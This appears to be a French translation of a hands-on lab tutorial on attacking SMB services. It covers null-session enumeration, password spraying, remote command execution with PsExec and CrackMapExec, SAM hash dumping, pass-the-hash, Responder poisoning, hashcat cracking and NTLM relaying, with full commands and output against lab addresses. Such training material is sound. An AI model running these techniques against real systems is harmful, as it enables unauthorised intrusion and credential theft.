# Attquer SMB
Server Message Block (SMB) est un protocole de communication créé pour fournir un accès partagé aux fichiers et aux imprimantes entre les nœuds d'un réseau. Initialement, il a été conçu pour s'exécuter sur NetBIOS sur TCP/IP (NBT) en utilisant le port TCP 139 et les ports UDP 137 et 138. Cependant, avec Windows 2000, Microsoft a ajouté la possibilité d'exécuter SMB directement sur TCP/IP sur le port 445 sans la couche NetBIOS supplémentaire. De nos jours, les systèmes d'exploitation Windows modernes utilisent SMB sur TCP mais prennent toujours en charge l'implémentation de NetBIOS en tant que basculement.

Samba est une implémentation open source basée sur Unix/Linux du protocole SMB. Il permet également aux serveurs Linux/Unix et aux clients Windows d'utiliser les mêmes services SMB.

Par exemple, sous Windows, SMB peut s'exécuter directement sur le port 445 TCP/IP sans avoir besoin de NetBIOS sur TCP/IP, mais si Windows a activé NetBIOS, ou si nous ciblons un hôte non Windows, nous trouverons SMB s'exécutant sur le port 139 TCP/IP. Cela signifie que SMB s'exécute avec NetBIOS sur TCP/IP.

Un autre protocole couramment lié à SMB est MSRPC (Microsoft Remote Procedure Call). RPC fournit à un développeur d'applications un moyen générique d'exécuter une procédure (c'est-à-dire une fonction) dans un processus local ou distant sans avoir à comprendre les protocoles réseau utilisés pour prendre en charge la communication, comme spécifié dans MS-RPCE, qui définit un protocole RPC sur SMB qui peut utiliser les canaux nommés du protocole SMB comme transport sous-jacent.

Pour attaquer un serveur SMB, nous devons comprendre son implémentation, son système d'exploitation et les outils que nous pouvons utiliser pour en abuser. Comme avec d'autres services, nous pouvons abuser d'une mauvaise configuration ou de privilèges excessifs, exploiter des vulnérabilités connues ou découvrir de nouvelles vulnérabilités. De plus, après avoir accédé au service SMB, si nous interagissons avec un dossier partagé, nous devons être conscients du contenu du répertoire. Enfin, si nous ciblons NetBIOS ou RPC, identifiez les informations que nous pouvons obtenir ou les actions que nous pouvons effectuer sur la cible.

## Énumération
Selon l'implémentation SMB et le système d'exploitation, nous obtiendrons différentes informations à l'aide de Nmap. Gardez à l'esprit que lorsque vous ciblez le système d'exploitation Windows, les informations de version ne sont généralement pas incluses dans les résultats de l'analyse Nmap. Au lieu de cela, Nmap essaiera de deviner la version du système d'exploitation. Cependant, nous aurons souvent besoin d'autres analyses pour identifier si la cible est vulnérable à un exploit particulier. Nous couvrirons la recherche de vulnérabilités connues plus loin dans cette section. Pour l'instant, analysons les ports 139 et 445 TCP.
```
dsgsec@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

Le scan Nmap révèle des informations essentielles sur la cible :

+ Version PME (Samba smbd 4.6.2)
+ Nom d'hôte HTB
+ Le système d'exploitation est Linux basé sur l'implémentation SMB
+ Explorons certaines erreurs de configuration courantes et les attaques spécifiques aux protocoles.

## Mauvaises configurations
SMB peut être configuré pour ne pas exiger d'authentification, souvent appelée session nulle. Au lieu de cela, nous pouvons nous connecter à un système sans nom d'utilisateur ni mot de passe.

### Authentification anonyme
Si nous trouvons un serveur SMB qui ne nécessite pas de nom d'utilisateur et de mot de passe ou qui trouve des informations d'identification valides, nous pouvons obtenir une liste de partages, noms d'utilisateur, groupes, autorisations, politiques, services, etc. La plupart des outils qui interagissent avec SMB permettent une connectivité de session nulle, y compris smbclient, smbmap, rpcclient ou enum4linux. Explorons comment nous pouvons interagir avec les partages de fichiers et RPC en utilisant l'authentification nulle.

### Partage de fichiers
En utilisant smbclient, nous pouvons afficher une liste des partages du serveur avec l'option -L, et en utilisant l'option -N, nous disons à smbclient d'utiliser la session nulle.
```
dsgsec@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```
Smbmap est un autre outil qui nous aide à énumérer les partages réseau et à accéder aux autorisations associées. Un avantage de smbmap est qu'il fournit une liste d'autorisations pour chaque dossier partagé.

```
dsgsec@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

En utilisant smbmap avec l'option -r ou -R (récursive), on peut parcourir les répertoires :
```
dsgsec@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

Dans l'exemple ci-dessus, les autorisations sont définies sur READ et WRITE, que l'on peut utiliser pour télécharger et télécharger les fichiers.

```
dsgsec@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```
```
dsgsec@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### Appel de procédure distante (RPC)
Nous pouvons utiliser l'outil rpcclient avec une session nulle pour énumérer un poste de travail ou un contrôleur de domaine.

L'outil rpcclient nous offre de nombreuses commandes différentes pour exécuter des fonctions spécifiques sur le serveur SMB afin de collecter des informations ou de modifier les attributs du serveur comme un nom d'utilisateur. Nous pouvons utiliser cette feuille de triche du SANS Institute ou consulter la liste complète de toutes ces fonctions trouvées sur la page de manuel du rpcclient.
```
dsgsec@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Enum4linux est un autre utilitaire qui prend en charge les sessions nulles et utilise nmblookup, net, rpcclient et smbclient pour automatiser certaines énumérations courantes à partir de cibles SMB telles que :
+ Groupe de travail/nom de domaine
+ Informations sur les utilisateurs
+ Informations sur le système d'exploitation
+ Informations sur les groupes
+ Dossiers partagés
+ Informations sur la stratégie de mot de passe

L'outil original a été écrit en Perl et réécrit par Mark Lowe en Python.
```
dsgsec@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

## Attaques spécifiques au protocole
Si une session nulle n'est pas activée, nous aurons besoin d'informations d'identification pour interagir avec le protocole SMB. Deux façons courantes d'obtenir des informations d'identification sont le forçage brutal et la pulvérisation de mots de passe.

### Brute Forcing et pulvérisation de mots de passe
Lors du forçage brutal, nous essayons autant de mots de passe que possible sur un compte, mais cela peut verrouiller un compte si nous atteignons le seuil. Nous pouvons utiliser la force brute et nous arrêter avant d'atteindre le seuil si nous le connaissons. Sinon, nous vous déconseillons d'utiliser la force brute.

La pulvérisation de mots de passe est une meilleure alternative car nous pouvons cibler une liste de noms d'utilisateur avec un mot de passe commun pour éviter les verrouillages de compte. Nous pouvons essayer plusieurs mots de passe si nous connaissons le seuil de verrouillage du compte. En règle générale, deux à trois tentatives sont sans danger, à condition d'attendre 30 à 60 minutes entre les tentatives. Explorons l'outil CrackMapExec qui inclut la possibilité d'exécuter la pulvérisation de mot de passe.

Avec CrackMapExec (CME), nous pouvons cibler plusieurs adresses IP, en utilisant de nombreux utilisateurs et mots de passe. Explorons un cas d'utilisation quotidien pour la pulvérisation de mot de passe. Pour effectuer une pulvérisation de mot de passe contre une adresse IP, nous pouvons utiliser l'option -u pour spécifier un fichier avec une liste d'utilisateurs et -p pour spécifier un mot de passe. Cela tentera d'authentifier chaque utilisateur de la liste à l'aide du mot de passe fourni.

```
dsgsec@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```
dsgsec@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

### SMB
Les serveurs Linux et Windows SMB fournissent différents chemins d'attaque. Habituellement, nous n'aurons accès qu'au système de fichiers, abuserons des privilèges ou exploiterons les vulnérabilités connues dans un environnement Linux, comme nous le verrons plus loin dans cette section. Cependant, sous Windows, la surface d'attaque est plus importante.

Lors de l'attaque d'un serveur Windows SMB, nos actions seront limitées par les privilèges que nous avions sur l'utilisateur que nous parvenons à compromettre. Si cet utilisateur est un administrateur ou dispose de privilèges spécifiques, nous pourrons effectuer des opérations telles que :
+ Exécution de commandes à distance
+ Extraire les hachages de la base de données SAM
+ Énumération des utilisateurs connectés
+ Pass-the-Hash (PTH)

Voyons comment nous pouvons effectuer de telles opérations. De plus, nous apprendrons comment le protocole SMB peut être abusé pour récupérer le hachage d'un utilisateur comme méthode pour augmenter les privilèges ou accéder à un réseau.

### Exécution de code à distance (RCE)
Avant de vous lancer dans l'exécution d'une commande sur un système distant à l'aide de SMB, parlons de Sysinternals. Le site Web Windows Sysinternals a été créé en 1996 par Mark Russinovich et Bryce Cogswell pour offrir des ressources techniques et des utilitaires pour gérer, diagnostiquer, dépanner et surveiller un environnement Microsoft Windows. Microsoft a acquis Windows Sysinternals et ses actifs le 18 juillet 2006.

Sysinternals proposait plusieurs outils gratuits pour administrer et surveiller les ordinateurs exécutant Microsoft Windows. Le logiciel est maintenant disponible sur le site Web de Microsoft. L'un de ces outils gratuits pour administrer des systèmes distants est PsExec.

PsExec est un outil qui nous permet d'exécuter des processus sur d'autres systèmes, avec une interactivité complète pour les applications console, sans avoir à installer manuellement le logiciel client. Cela fonctionne car il a une image de service Windows à l'intérieur de son exécutable. Il prend ce service et le déploie sur le partage admin$ (par défaut) sur la machine distante. Il utilise ensuite l'interface DCE/RPC sur SMB pour accéder à l'API Windows Service Control Manager. Ensuite, il démarre le service PSExec sur la machine distante. Le service PSExec crée ensuite un canal nommé qui peut envoyer des commandes au système.

Nous pouvons télécharger PsExec à partir du site Web de Microsoft, ou nous pouvons utiliser certaines implémentations Linux :

+ Impacket PsExec - Python PsExec comme exemple de fonctionnalité utilisant RemComSvc.
+ Impacket SMBExec - Une approche similaire à PsExec sans utiliser RemComSvc. La technique est décrite ici. Cette implémentation va encore plus loin en instanciant un serveur SMB local pour recevoir la sortie des commandes. Ceci est utile lorsque la machine cible ne dispose PAS d'un partage inscriptible disponible.
+ Impacket atexec - Cet exemple exécute une commande sur la machine cible via le service Planificateur de tâches et renvoie la sortie de la commande exécutée.
CrackMapExec - inclut une implémentation de smbexec et d'atexec.
+ Metasploit PsExec - Implémentation Ruby PsExec.

### Impacket PsExec
Pour utiliser impacket-psexec, nous devons fournir le domaine/nom d'utilisateur, le mot de passe et l'adresse IP de notre machine cible. Pour des informations plus détaillées, nous pouvons utiliser l'aide d'impacket :
```
dsgsec@htb[/htb]$ impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

Pour vous connecter à une machine distante avec un compte administrateur local, en utilisant impacket-psexec, vous pouvez utiliser la commande suivante :
```
dsgsec@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

Les mêmes options s'appliquent à impacket-smbexec et impacket-atexec.

### CrackMapExec
CrackMapExec est un autre outil que nous pouvons utiliser pour exécuter CMD ou PowerShell. L'un des avantages de CrackMapExec est la possibilité d'exécuter une commande sur plusieurs hôtes à la fois. Pour l'utiliser, nous devons spécifier le protocole, smb, l'adresse IP ou la plage d'adresses IP, l'option -u pour le nom d'utilisateur et -p pour le mot de passe, et l'option -x pour exécuter les commandes cmd ou majuscule -X pour exécuter Commandes PowerShell.

```
dsgsec@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

### Énumération des utilisateurs connectés
Imaginez que nous sommes dans un réseau avec plusieurs machines. Certains d'entre eux partagent le même compte d'administrateur local. Dans ce cas, nous pourrions utiliser CrackMapExec pour énumérer les utilisateurs connectés sur toutes les machines du même réseau 10.10.110.17/24, ce qui accélère notre processus d'énumération.
```
dsgsec@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

### Extraire les hachages de la base de données SAM
Le gestionnaire de compte de sécurité (SAM) est un fichier de base de données qui stocke les mots de passe des utilisateurs. Il peut être utilisé pour authentifier les utilisateurs locaux et distants. Si nous obtenons des privilèges administratifs sur une machine, nous pouvons extraire les hachages de la base de données SAM à différentes fins :

+ Authenticate as another user.
+ Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
+ Pass The Hash. We will discuss it later in this section.
```
dsgsec@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

### Pass-the-Hash (PtH)
Si nous parvenons à obtenir un hachage NTLM d'un utilisateur, et si nous ne pouvons pas le casser, nous pouvons toujours utiliser le hachage pour s'authentifier sur SMB avec une technique appelée Pass-the-Hash (PtH). PtH permet à un attaquant de s'authentifier auprès d'un serveur ou d'un service distant à l'aide du hachage NTLM sous-jacent du mot de passe d'un utilisateur au lieu du mot de passe en clair. Nous pouvons utiliser une attaque PtH avec n'importe quel outil Impacket, SMBMap, CrackMapExec, entre autres outils. Voici un exemple de la façon dont cela fonctionnerait avec CrackMapExec :
```
dsgsec@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

### Attaques d'authentification forcée
Nous pouvons également abuser du protocole SMB en créant un faux serveur SMB pour capturer les hachages NetNTLM v1/v2 des utilisateurs.

L'outil le plus courant pour effectuer de telles opérations est le répondeur. Responder est un outil d'empoisonnement LLMNR, NBT-NS et MDNS avec différentes capacités, l'une d'entre elles est la possibilité de configurer de faux services, y compris SMB, pour voler les hachages NetNTLM v1/v2. Dans sa configuration par défaut, il trouvera le trafic LLMNR et NBT-NS. Ensuite, il répondra au nom des serveurs recherchés par la victime et capturera leurs hachages NetNTLM.

Illustrons un exemple pour mieux comprendre le fonctionnement de Responder. Imaginez que nous créons un faux serveur SMB en utilisant la configuration par défaut de Responder, avec la commande suivante :
```
dsgsec@htb[/htb]$ responder -I <interface name>
```

Lorsqu'un utilisateur ou un système tente d'effectuer une résolution de nom (NR), une série de procédures est menée par une machine pour récupérer l'adresse IP d'un hôte par son nom d'hôte. Sur les machines Windows, la procédure sera à peu près la suivante :

+ L'adresse IP du partage de fichiers de nom d'hôte est requise.
+ Le fichier hôte local (C:\Windows\System32\Drivers\etc\hosts) sera vérifié pour les enregistrements appropriés.
= Si aucun enregistrement n'est trouvé, la machine bascule vers le cache DNS local, qui conserve la trace des noms récemment résolus.
+ N'y a-t-il pas d'enregistrement DNS local ? Une requête sera envoyée au serveur DNS qui a été configuré.
+ Si tout le reste échoue, la machine émettra une requête multidiffusion, demandant l'adresse IP du partage de fichiers à partir d'autres machines sur le réseau.

Supposons qu'un utilisateur ait mal saisi le nom d'un dossier partagé \\mysharefoder\ au lieu de \\mysharedfolder\. Dans ce cas, toutes les résolutions de noms échoueront car le nom n'existe pas et la machine enverra une requête multidiffusion à tous les appareils du réseau, y compris nous exécutant notre faux serveur SMB. C'est un problème parce qu'aucune mesure n'est prise pour vérifier l'intégrité des réponses. Les attaquants peuvent profiter de ce mécanisme en écoutant ces requêtes et en usurpant les réponses, ce qui amène la victime à croire que les serveurs malveillants sont dignes de confiance. Cette confiance est généralement utilisée pour voler des informations d'identification.

```
dsgsec@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Ces informations d'identification capturées peuvent être piratées à l'aide de hashcat ou relayées vers un hôte distant pour terminer l'authentification et usurper l'identité de l'utilisateur.

Tous les hachages enregistrés sont situés dans le répertoire des journaux du répondeur (/usr/share/responder/logs/). Nous pouvons copier le hachage dans un fichier et tenter de le déchiffrer à l'aide du module hashcat 5600.

```
dsgsec@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

Le hachage NTLMv2 a été fissuré. Le mot de passe est P@ssword. Si nous ne pouvons pas déchiffrer le hachage, nous pouvons potentiellement relayer le hachage capturé vers une autre machine en utilisant impacket-ntlmrelayx ou Responder MultiRelay.py. Voyons un exemple utilisant impacket-ntlmrelayx.

Tout d'abord, nous devons définir SMB sur OFF dans notre fichier de configuration de répondeur (/etc/responder/Responder.conf).
```
dsgsec@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Ensuite, nous exécutons impacket-ntlmrelayx avec l'option --no-http-server, -smb2support et la machine cible avec l'option -t. Par défaut, impacket-ntlmrelayx videra la base de données SAM, mais nous pouvons exécuter des commandes en ajoutant l'option -c.

```
dsgsec@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
